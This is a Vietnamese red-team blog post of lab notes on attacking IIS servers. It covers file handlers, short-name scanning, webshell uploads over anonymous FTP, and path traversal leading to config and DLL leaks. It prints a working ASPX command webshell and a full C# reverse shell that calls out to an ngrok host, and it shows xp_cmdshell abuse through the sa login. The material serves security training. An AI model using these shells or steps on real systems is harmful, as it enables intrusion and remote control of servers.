---
layout: post
title: Windows Initial Access
date: 2026-02-05 10:15:00 +0700
tags: redteam WindowsInitialAccess
categories: jekyll update
---

# Tìm hiểu `IIS`

---

Đầu tiên, mình có một máy ảo Windows với credentials là **`user:password123`** và **`winpriv:windows`**, và trên máy này được chạy **`IIS7` →** đây là webserver trên Windows 

![image](/assets/images/redteam/WindowsInitialAccess/image%201.png)

Như vậy từ đây mình có hai thắc mắc lớn

- Trên Windows thì có chỉ thể chạy được **`IIS`** thôi à ? Nó có thể chạy được **`Apache`** không?
- Trên **`Apache`** thì nó xử lý được file là nhờ **`httpd`** mà **`httpd`** chạy được thì nhờ tới **`config`** . Thì trên **`IIS`** để xử lý các file thì nó nhờ gì?

Sau quá trình tìm hiểu thì mình có các câu trả lời như sau: 

![image](/assets/images/redteam/WindowsInitialAccess/image%202.png)

Đây là các stack tech phổ biến có thể nói là đặc trưng trên hai hệ điều hành. Về mặt cơ bản thì **`Apache`** vẫn có thể chạy trên Windows và **`IIS`** cũng có thể chạy trên Linux, nhưng nó sẽ phát huy hết tính năng khi được chạy trên đúng HĐH mà nó vốn thuộc về.

![image](/assets/images/redteam/WindowsInitialAccess/image%203.png)

Như vậy nhìn thấy thì trên Windows thì có kha khá thứ đặc trưng :”> 

Và cũng khác biệt về cấu trúc file. 

![image](/assets/images/redteam/WindowsInitialAccess/image%204.png)

![image](/assets/images/redteam/WindowsInitialAccess/image%205.png)

Từ đây là mình đã hiểu được **`IIS`** sẽ đi với **`ASP.NET`** 

Và mình sẽ thử một vài demo chạy code **`ASP`** để tìm hiểu rõ hơn.

## ✳️ `IIS` chạy các file gì?

---

### ✨ `ASP Classic`

```vbnet
**<%@ Language="VBScript" %>
<html>
<head>
    <title>ASP Classic + HTML</title>
</head>

<body>
    <h1>Demo ASP Classic tren IIS7</h1>

    <p>This is HTML</p> 

    <%
    Dim name, i
    name = "ho4ngphwc"
    %>

    <p>Xin Chao: <b><%= name %></b></p>

    <h3>Vong lap sinh HTML</h3> 
    <ul>
    <%
    For i = 1 To 5 
    %>
        <li>Dong so <%= i %> - Time: <%= Now() %></li>
    <%
    Next
    %>

    <hr> 

    <p>Server name: <%= Request.ServerVariables("SERVER_NAME") %></p>
    <p>User chay IIS: <%= Request.ServerVariables("LOGON_USER")%></p>
    </ul>
</body>
</html>**
```

![image](/assets/images/redteam/WindowsInitialAccess/image%206.png)

### ✨ `ASP.NET` (`.aspx`) - Execution Code

```vbnet
**<%@ Page Language="C#" %> 
<%
    var p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c ipconfig";
    p.StartInfo.UseShellExecute = false; 
    p.StartInfo.RedirectStandardOutput = true; 
    p.Start();

    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
%>**
```

Khi chạy mình sẽ báo lỗi. 

![image](/assets/images/redteam/WindowsInitialAccess/image%207.png)

Từ đây, nhìn thấy nó có gợi ý để in ra lỗi chi tiết hơn bằng cách set **`web.config`** 

![image](/assets/images/redteam/WindowsInitialAccess/image%208.png)

Khi reload lại file → nó in ra chi tiết lỗi

![image](/assets/images/redteam/WindowsInitialAccess/image%209.png)

Điều này thì hoàn toàn có thể tiết lộ source code. 

Như vậy mình cần fix lại 

```vbnet
**<%@ Page Language="C#" %> 
<%
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c ipconfig";
    p.StartInfo.UseShellExecute = false; 
    p.StartInfo.RedirectStandardOutput = true; 
    p.Start();

    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
%>**
```

![image](/assets/images/redteam/WindowsInitialAccess/image%2010.png)

### ✨ Execution Code

```vbnet
**<%@ Page Language="C#" %>

<%
    string cmd = Request["cmd"];

    if (cmd != null)
    {
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c" + cmd;
        p.StartInfo.UseShellExecute = false; 
        p.StartInfo.RedirectStandardOutput = true; 
        p.Start();

        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
%>**
```

![image](/assets/images/redteam/WindowsInitialAccess/image%2011.png)

Ngoài ra thì **`IIS`** còn xử lý các đuôi file khác như **`.cer`** , **`.dll`** , …

### ✨ `.cer`

Mình tạo 1 file **`.cer`** có nội dung như sau: 

```c
**<%
    Response.Write "HIII!"
%>**
```

Khi đó **`IIS`** vẫn có thể chạy được. 

![image](/assets/images/redteam/WindowsInitialAccess/image%2012.png)

Thì tại sao **`IIS`** có thể làm được như vậy. 

![image](/assets/images/redteam/WindowsInitialAccess/image%2013.png)

Để tìm hiểu nguyên nhân thì vào file **`applicationHost.config`** quan sát tại dòng 790

![image](/assets/images/redteam/WindowsInitialAccess/image%2014.png)

Thì tại đây là **`IIS`** định nghĩa một thằng handler để có thể xử lý thông qua module **`IsapiModule` →** đây là lí do tại sao **`IIS`** chạy được và nó còn xử lý rất rất nhiều đuôi file khác. 

## ✳️ Các file extension khác trên `IIS`

---

### ✨ `.rem`

### ✨ `.asmx`

Mình đặt file **`HelloService.asmx`** 

```vbnet
**<%@ WebService Language="C#" Class="HelloService" %>**
```

Sau đó mình đặt file **`HelloService.cs`** tại **`wwwroot/App_Code/HelloService.cs`** 

```vbnet
**using System.Web.Services;

[WebService(Namespace = "http://example.com/hello")]
public class HelloService : WebService
{
    [WebMethod]
    public string SayHello(string name)
    {
        return "Hello " + name;
    }
}**

```

Thì khi đó mình truy cập thì được **`IIS`** xử lí.

![image](/assets/images/redteam/WindowsInitialAccess/image%2015.png)

Thì tại sao lại như vậy? Có thể hiểu để chạy các file `.asmx` này hay các file `.soap` thì nó sẽ chạy theo dạng service API gì đó.

![image](/assets/images/redteam/WindowsInitialAccess/image%2016.png)

Thì khi nào lúc nào cũng sẽ có dòng **`Service Descriptiton`** 

![image](/assets/images/redteam/WindowsInitialAccess/image%2017.png)

Đây giống như nơi mô tả lại các trường để giúp mình giao tiếp đúng hơn. 

Thì để dễ dùng hơn thì mình dùng một extension trên BurpSuite là **Wsdler** → sẽ cho phép mình parse dễ hiểu hơn.

![image](/assets/images/redteam/WindowsInitialAccess/image%2018.png)

Kết quả trả về sẽ như thế này.

![image](/assets/images/redteam/WindowsInitialAccess/image%2019.png)

Thì ở đây mình thực hiện lại là tạo 1 file SimpleServiceMath như sau:

```vbnet
**using System.Web.Services;

[WebService(Namespace = "http://example.com/math")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
public class SimpleServiceMath : WebService
{
    [WebMethod]
    public int Add(int a, int b)
    {
        return a + b;
    }

    [WebMethod]
    public int Subtract(int a, int b)
    {
        return a - b;
    }

    [WebMethod]
    public int Multiply(int a, int b)
    {
        return a * b;
    }

    [WebMethod]
    public int Divide(int a, int b)
    {
        if (b == 0)
            return 0;

        return a / b;
    }
}**

```

Thì khi đó mình tạo lại với file.

```vbnet
**<%@ WebService Language="C#" Class="SimpleServiceMath" %>**
```

![image](/assets/images/redteam/WindowsInitialAccess/image%2020.png)

### ✨ `.soap`

Thì khi đó mình có thể giao tiếp với endpoint này bằng cách tạo ra 1 file **`add.soap`**  

```vbnet
**<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:xsd="http://www.w3.org/2001/XMLSchema"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

  <soap:Body>
    <Add xmlns="http://example.com/math">
      <a>5</a>
      <b>3</b>
    </Add>
  </soap:Body>
</soap:Envelope>**

```

Nhưng mình sẽ dùng extension **`Wsdler`** để thực hiện

![image](/assets/images/redteam/WindowsInitialAccess/image%2021.png)

Như vậy xong phần khám phá các file trên **`IIS`** ngoài thì còn rất nhiều cách khác nhau.

## ✳️ Đặc trưng trên Windows

---

Ngoài các đường dẫn mình đã biết thì trên windows đều support cả hai dấu **`/`** và **`\`** 

Ngoài ra Windows còn có file nhạy cảm là **`C:\Windows\win.INI`** 

Hơn nữa là shortname trên Windows → là một loại đường dẫn ngắn từ thời MS-DOS.

![image](/assets/images/redteam/WindowsInitialAccess/image%2022.png)

Nhưng đến hiện tại thì Windows 11 vẫn còn đường dẫn này.

Vì sao lại có chiện này thì short file name là một cái để chứa 3 ký tự của đuôi file và 8 ký tự của filename → nếu vượt qua thì nó sẽ hiển thị short file name.

![image](/assets/images/redteam/WindowsInitialAccess/image%2023.png)

Và hiện tại nó vẫn hỗ trợ wildcard và ký tự **`?`**.

![image](/assets/images/redteam/WindowsInitialAccess/image%2024.png)

Dựa vào đặc trưng này mà **`IIS`** nó vẫn support điều này dẫn tới attacker có thể bruteforce short file name để đoán.

Thì tool hiệu quả để thực hiện là shortscan https://github.com/bitquark/shortscan 

![image](/assets/images/redteam/WindowsInitialAccess/image%2025.png)

# 🧪 LAB 1

---

Đầu tiên mình scan qua host này nó mở những port nào ❓❓❓ 

![image](/assets/images/redteam/WindowsInitialAccess/image%2026.png)

Nhìn thấy nó mở **`ftp`** 

Cho nên mình test thử xem nó có bật anonymous account hay ko ❓❓ 

![image](/assets/images/redteam/WindowsInitialAccess/image%2027.png)

Thì đúng y như vậy và mình hoàn toàn đang đứng trong **`inetpub/wwwroot`** 

Như vậy nếu mình upload 1 file web shell lên thì sao ❓❓ 

Nhưng trước tiên mình cần upload 1 file `test.txt` để chắc chắn trước khi hành động.

![image](/assets/images/redteam/WindowsInitialAccess/image%2028.png)

![image](/assets/images/redteam/WindowsInitialAccess/image%2029.png)

Như vậy thì nó hoàn toàn có thể upload file. Mình có thể lợi dụng để upload các webshell.

### **✨ `ASPX`**

<aside>
💡

**`Active Server Page Extended (ASPX)`** là file extension mặc định cho web form trong **`ASP.NET` -** một server-side web application framework được phát triển bởi Microsoft. **`IIS`** được thiết kế có sẵn khả năng hỗ trợ **`ASP.NET`** khiến nó có khả năng xử lý các tệp **`ASPX`**.

</aside>

Mình tìm shell trong repo này https://github.com/tennc/webshell

- https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx

![image](/assets/images/redteam/WindowsInitialAccess/image%2030.png)

Sau đó mình truy cập shell đã cắm. 

![image](/assets/images/redteam/WindowsInitialAccess/image%2031.png)

### ✨ `ASP`

<aside>
💡

**`Active Server Pages (ASP)`** là tiền thân của **`ASPX`**, giúp tạo các trang web động trên các nền tảng của Microsoft. **`IIS`** vẫn hỗ trợ **`ASP`** vì các vấn đề liên quan đến việc tương thích ngược (backward compatibility).

</aside>

Mình lấy shell này để dễ thực hiện

- https://github.com/tennc/webshell/blob/master/asp/webshell.asp

![image](/assets/images/redteam/WindowsInitialAccess/image%2032.png)

Mình lại truy cập sang bằng shell mới này. 

![image](/assets/images/redteam/WindowsInitialAccess/image%2033.png)

### ✨ `web.config`

<aside>
💡

**`web.config`** là tệp XML chứa dữ liệu cài đặt và cấu hình cho ứng dụng web trong các ứng dụng **`ASP.NET`**. Tuy nhiên, tệp cấu hình này vẫn có khả năng thực thi code bằng nhiều cách cấu hình khác nhau.

</aside>

Tìm tới shell qua đây https://github.com/tennc/webshell/blob/master/aspx/web.config 

![image](/assets/images/redteam/WindowsInitialAccess/image%2034.png)

![image](/assets/images/redteam/WindowsInitialAccess/image%2035.png)

### ✨ `SOAP`

<aside>
💡

**`Simple Object Access Protocol (SOAP)`** là một giao thức để trao đổi thông tin có cấu trúc trong việc triển khai các dịch vụ web. Các tin nhắn SOAP được định dạng bằng XML.

</aside>

Tiếp tục lấy shell để cắm https://github.com/tennc/webshell/blob/master/caidao-shell/Customize.soap 

> **Lưu ý**: Webshell trên không có khả năng thực thi os command, tuy nhiên vẫn có khả năng download file nên ý tưởng của chúng ta là sẽ sử dụng webshell này để kéo một webshell khác có khả năng thực thi os command.
> 

![image](/assets/images/redteam/WindowsInitialAccess/image%2036.png)

![image](/assets/images/redteam/WindowsInitialAccess/image%2037.png)

Sau đó mình cho chạy qua extension trong Burp để đễ thao tác. 

![image](/assets/images/redteam/WindowsInitialAccess/image%2038.png)

Sau đó mình bắt Chopper sang repeater.

- **`z`**: L
- **`z1`**: Đường dẫn tải webshell (ví dụ: **`http://<kali_ip>/soap.aspx`**)
- **`z2`**: Đường dẫn lưu webshell (ví dụ: **`C:/inetpub/wwwroot/soap.aspx`**)

![image](/assets/images/redteam/WindowsInitialAccess/image%2039.png)

Quan sát tại server kali thì thấy có request đến. 

![image](/assets/images/redteam/WindowsInitialAccess/image%2040.png)

Như vậy là đã có file tải xuống. 

![image](/assets/images/redteam/WindowsInitialAccess/image%2041.png)

# 🧪 LAB 2

---

> Target 1:
> 
> - Đây là thử thách Blackbox
> - Mục tiêu: RCE server và đọc bí mật ở thư mục **`C:\Windows\System32\inetsrv`**

Mình cần truy cập qua **`http://103.90.227.95/`** 

### Recon

![image](/assets/images/redteam/WindowsInitialAccess/image%2042.png)

Đây là giao diện của web và cho phép upload. 

Đầu tiên mình cần recon xem nó viết bằng gì.

![image](/assets/images/redteam/WindowsInitialAccess/image%2043.png)

Như vậy nó viết bằng **`ASP.NET`** → mình sẽ thực hiện directory scan thử có gì đặc biệt.

Mình xác định được có bị lỗ hổng hay ko bằng **`shortscan`** 

![image](/assets/images/redteam/WindowsInitialAccess/image%2044.png)

![image](/assets/images/redteam/WindowsInitialAccess/image%2045.png)

Như vậy mình thử upload file **`.txt`** 

![image](/assets/images/redteam/WindowsInitialAccess/image%2046.png)

Sau khi upload được thì mình có chức năng **`Download`** 

![image](/assets/images/redteam/WindowsInitialAccess/image%2047.png)

![image](/assets/images/redteam/WindowsInitialAccess/image%2048.png)

Có vẻ là nó thực hiện đọc file mình upload. Như vậy thì nó cho phép mình upload những file gì❓❓

Sau khi thực hiện thì fuzz các extension thì nó hoàn toàn cho phép upload hết đuôi file (┬┬﹏┬┬) → khó nhỉ X_X

### Path Traversal

Tại endpoint **`Raw.aspx?name=`** in ra nội dung file thì nó phải duyệt ra đường dẫn vậy chỗ này có thể bị **`Path Traversal` ❓❓** 

Mình thực hiện truyền thử hai đường dẫn này:

- **`\windows\win.ini`**

![image](/assets/images/redteam/WindowsInitialAccess/image%2049.png)

- **`\windows\System32\drivers\etc\hosts`**

![image](/assets/images/redteam/WindowsInitialAccess/image%2050.png)

> Như vậy endpoint **`Raw.aspx?name=`** dính **`path traversal` （づ￣3￣）づ╭❤️～**
> 

### `web.config`

Từ đây mình bắt đầu đọc file **`web.config`** của web.

![image](/assets/images/redteam/WindowsInitialAccess/image%2051.png)

Quan sát kĩ file này mình thấy như sau: 

![image](/assets/images/redteam/WindowsInitialAccess/image%2052.png)

- Có file **`bin\tempbin.dll`**

![image](/assets/images/redteam/WindowsInitialAccess/image%2053.png)

- Có **`c:\TempImageFiles\`** , **`key=ChartImageHandle`** và **`PublicKeyToken`**

![image](/assets/images/redteam/WindowsInitialAccess/image%2054.png)

- Có **`ConnectionStrings.config`**

Như vậy mình thử truy cập **`bin\tempbin.dll`** để download file này về qua endpoint **`Raw.aspx?name=`**

### `bin\tempbin.dll`

Sau khi lấy được file **`tempbin.dll`** thì mình thực hiện decompile lại để có thể đọc file này bằng **`ILSPy`** (⓿_⓿) và ****Sau khi mình decompile thì được như sau φ(*￣0￣)

```vbnet
protected void Page_Load(object sender, EventArgs e)
{
	string text = base.Request.QueryString["name"];
	if (!string.IsNullOrEmpty(text))
	{
		try
		{
			string[] array = text.Split('/');
			string value = array[array.Length - 1];
			string value2 = array[array.Length - 2];
			string connectionString = ConfigurationManager.ConnectionStrings["dbconnection"].ConnectionString;
			string cmdText = "SELECT * FROM Sessions WHERE FolderName = @folderName and FileName = @fileName ORDER BY SessionID DESC";
			using SqlConnection sqlConnection = new SqlConnection(connectionString);
			sqlConnection.Open();
			using SqlCommand sqlCommand = new SqlCommand(cmdText, sqlConnection);
			sqlCommand.Parameters.AddWithValue("@folderName", value2);
			sqlCommand.Parameters.AddWithValue("@fileName", value);
			using SqlDataReader sqlDataReader = sqlCommand.ExecuteReader();
			if (sqlDataReader.Read())
			{
				DateTime dateTime = sqlDataReader.GetDateTime(3);
				DateTime now = DateTime.Now;
				if ((now - dateTime).TotalMinutes < 60.0)
				{
					string text2 = sqlDataReader.GetString(1);
					string text3 = sqlDataReader.GetString(2);
					string path = base.Server.MapPath("~/tempbin/" + text3);
					string text4 = Path.Combine(path, text2);
					if (System.IO.File.Exists(text4))
					{
						long length = new FileInfo(text4).Length;
						string text5 = (Convert.ToDouble(length) / 1024.0).ToString("0.00");
						string text6 = base.Request.Url.GetLeftPart(UriPartial.Authority) + "/Raw.aspx?name=" + text3 + "/" + text2;
						base.ClientScript.RegisterStartupScript(GetType(), "showResult", "showResult('" + text6 + "', '" + text5 + "', '" + text2 + "', '" + dateTime.ToString() + "')", addScriptTags: true);
					}
					else
					{
						base.ClientScript.RegisterStartupScript(GetType(), "showError", "showError('Invalid file path.')", addScriptTags: true);
					}
				}
				else
				{
					base.ClientScript.RegisterStartupScript(GetType(), "showError", "showError('Session expired.')", addScriptTags: true);
				}
			}
			else
			{
				base.ClientScript.RegisterStartupScript(GetType(), "showError", "showError('Invalid file path.')", addScriptTags: true);
			}
			return;
		}
		catch (Exception)
		{
			base.ClientScript.RegisterStartupScript(GetType(), "showError", "showError('An error occurred.')", addScriptTags: true);
			return;
		}
	}
	base.ClientScript.RegisterStartupScript(GetType(), "showError", "showError('Invalid file path.')", addScriptTags: true);
}
```

Đọc kỹ thì thấy nó sẽ đọc qua tham số **`name`** tại dòng

> **`string text = base.Request.QueryString["name"];`**
> 

Sau đó nó sẽ tách **`/`** để phân biệt **`foldername`** và **`filename`** 

Tiếp đó nó sẽ tra db với câu query là: 

> **`SELECT * FROM Sessions WHERE FolderName = @folderName and FileName = @fileName ORDER BY SessionID DESC`**
> 

Khi tra xong thì server kiểm tra xem nó còn trong thời gian không phải < **`60.0`** nếu thỏa thì nó sẽ đi thẳng tìm file trên ổ cứng ╰(艹皿艹 ) và thẳng vào trong **DocumentRoot** + folder **`/tempbin/`**

```vbnet
**string path = base.Server.MapPath("~/tempbin/" + text3); // Tìm đường dẫn thật
if (System.IO.File.Exists(text4)) // File có nằm đó không?**
```

Cuối cùng thì nó sẽ trả về lại kết quả. 

Mình thử tiến hành upload 1 reverse shell xem sao o(*￣︶￣*)o

```vbnet
**<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net.Sockets" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        // Thay thông tin Ngrok của bạn vào đây
        string host = "0.tcp.ap.ngrok.io";
        int port = 16354; 

        using (TcpClient client = new TcpClient(host, port))
        {
            using (Stream stream = client.GetStream())
            {
                using (StreamReader rdr = new StreamReader(stream))
                {
                    StreamWriter wtr = new StreamWriter(stream);
                    
                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardInput = true;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardError = true;
                    
                    p.OutputDataReceived += (s, args) => {
                        if (!string.IsNullOrEmpty(args.Data)) {
                            wtr.WriteLine(args.Data);
                            wtr.Flush();
                        }
                    };
                    
                    p.Start();
                    p.BeginOutputReadLine();

                    while (!p.HasExited) {
                        string input = rdr.ReadLine();
                        if (input == "exit") break;
                        p.StandardInput.WriteLine(input);
                    }
                }
            }
        }
    }
</script>**
```

Từ đây mình quan sát được netcat đang mở tại local.

![image](/assets/images/redteam/WindowsInitialAccess/image%2055.png)

Từ đây mình có tìm các thông tin hữu ích cho mình. 

![image](/assets/images/redteam/WindowsInitialAccess/image%2056.png)

Và sau đó mình đọc flag này. 

![image](/assets/images/redteam/WindowsInitialAccess/image%2057.png)

### `ConnectionStrings.config`

![image](/assets/images/redteam/WindowsInitialAccess/image%2058.png)

Ở đây mình thu được **`User ID`** và **`Password`** → **connect vào msssql**

### MSSQL

![image](/assets/images/redteam/WindowsInitialAccess/image%2059.png)

Khi login vào thì mình thấy user hiện tại là **`dbo`**. Giờ mình tiếp tục đào bới trong service này. 

![image](/assets/images/redteam/WindowsInitialAccess/image%2060.png)

Mình thấy có user **`dbo`** có RoleName là **`db_owner`**. Mình có được user này thì mình hoàn toàn quyền kiểm soát. （づ￣3￣）づ╭❤️～

Tới đây thì mình thử xem có bật được **`xp_cmdshell`** ko `(*>﹏<*)′

- **`xp_cmdshell`** thực thi lệnh OS từ SQL. Nếu mà mình bật ****được **`xp_cmdshell`** với 1 user có quyền cao hơn, thì mình hoàn toàn có thể thực thi code hoàn toàn hợp lí.

![image](/assets/images/redteam/WindowsInitialAccess/image%2061.png)

Nhìn kỹ thì mình mới là user **`tempbin`** chưa phải là cao nhất. Và quan sát thì thấy LoginName là **`sa`** thì mình login thử.

![image](/assets/images/redteam/WindowsInitialAccess/image%2062.png)

Như vậy thì mình đã vào trong user có quyền cao nhất → từ đó mình thử list ra xem có bao nhiêu user trong db này với lệnh **`xp_cmdshell whoami /all)`** 

![image](/assets/images/redteam/WindowsInitialAccess/image%2063.png)

Từ đây mình đã thực hiện lệnh **`cmd`** như vậy mình hoàn toàn có RCE. 

![image](/assets/images/redteam/WindowsInitialAccess/image%2064.png)

Từ đây mình thực đọc flag.


